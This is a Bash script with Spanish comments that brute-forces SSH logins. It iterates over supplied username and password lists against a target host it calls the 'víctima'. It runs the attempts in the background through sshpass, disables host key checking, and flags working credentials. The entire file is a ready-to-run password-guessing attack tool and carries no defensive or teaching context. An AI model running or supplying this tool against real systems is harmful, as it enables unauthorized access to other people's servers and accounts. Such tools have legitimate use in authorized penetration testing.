#!/bin/bash

# Colores para resaltar credenciales válidas en naranja y errores en rojo
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # No color

# Función para intentar autenticarse con SSH y resaltar credenciales válidas en naranja
try_ssh_credentials() {
    local usuario="$1"
    local password="$2"
    local objetivo="$3"
    local puerto="$4"
    local resultado

    resultado=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes "$usuario@$objetivo" -p "$puerto" 2>&1)

    if [[ $resultado == *"Permission denied"* ]]; then
        echo -e "${ORANGE}[-] Usuario:${NC} $usuario, ${BLUE}Contraseña:${NC} $password [INVALIDA]"
    elif [[ $resultado == *"No route to host"* || $resultado == *"Connection refused"* || $resultado == *"Host is down"* ]]; then
        echo -e "${RED}[!] No se alcanza la IP víctima:${NC} $objetivo"
    else
        echo -e "${RED}[+] Usuario:${NC} $usuario, ${RED}Contraseña:${NC} $password [${RED}VÁLIDA${NC}]"
    fi
}

# Mostrar el mensaje de uso si no se proporcionan argumentos
if [ $# -eq 0 ]; then
    echo "Uso: $0 [-u usuario | -U archivo_usuarios] [-l password | -L archivo_passwords] -t objetivo [-p puerto] [-v]"
    exit 1
fi

# Variables para opciones predeterminadas
usuario=""
archivo_usuarios=""
password=""
archivo_passwords=""
objetivo=""
puerto=22
red=""
verbose=false

# Procesar los argumentos de línea de comandos
while getopts ":u:U:l:L:t:p:r:v" opt; do
    case $opt in
        u)
            usuario="$OPTARG"
            ;;
        U)
            archivo_usuarios="$OPTARG"
            ;;
        l)
            password="$OPTARG"
            ;;
        L)
            archivo_passwords="$OPTARG"
            ;;
        t)
            objetivo="$OPTARG"
            ;;
        p)
            puerto="$OPTARG"
            ;;
        r)
            red="$OPTARG"
            ;;
        v)
            verbose=true
            ;;
        \?)
            echo "Opción inválida: -$OPTARG"
            exit 1
            ;;
        :)
            echo "La opción -$OPTARG requiere un argumento."
            exit 1
            ;;
    esac
done

# Verificar que se haya proporcionado al menos un usuario y una contraseña
if [[ -z "$usuario" && -z "$archivo_usuarios" ]]; then
    echo "Debe especificar un usuario o un archivo de usuarios."
    exit 1
fi

if [[ -z "$password" && -z "$archivo_passwords" ]]; then
    echo "Debe especificar una contraseña o un archivo de contraseñas."
    exit 1
fi

# Procesar usuarios y contraseñas en segundo plano con un retraso de 1 segundo entre conexiones
if [[ -n "$archivo_usuarios" ]]; then
    while IFS= read -r usuario_line; do
        if [[ -n "$archivo_passwords" ]]; then
            while IFS= read -r password_line; do
                try_ssh_credentials "$usuario_line" "$password_line" "$objetivo" "$puerto" &
                sleep 1  # Añadir un retraso de 1 segundo entre conexiones
            done < "$archivo_passwords"
        else
            try_ssh_credentials "$usuario_line" "$password" "$objetivo" "$puerto" &
            sleep 1  # Añadir un retraso de 1 segundo entre conexiones
        fi
    done < "$archivo_usuarios"
else
    if [[ -n "$archivo_passwords" ]]; then
        while IFS= read -r password_line; do
            try_ssh_credentials "$usuario" "$password_line" "$objetivo" "$puerto" &
            sleep 1  # Añadir un retraso de 1 segundo entre conexiones
        done < "$archivo_passwords"
    else
        try_ssh_credentials "$usuario" "$password" "$objetivo" "$puerto" &
        sleep 1  # Añadir un retraso de 1 segundo entre conexiones
    fi
fi

# Esperar a que todas las conexiones SSH en segundo plano terminen
wait
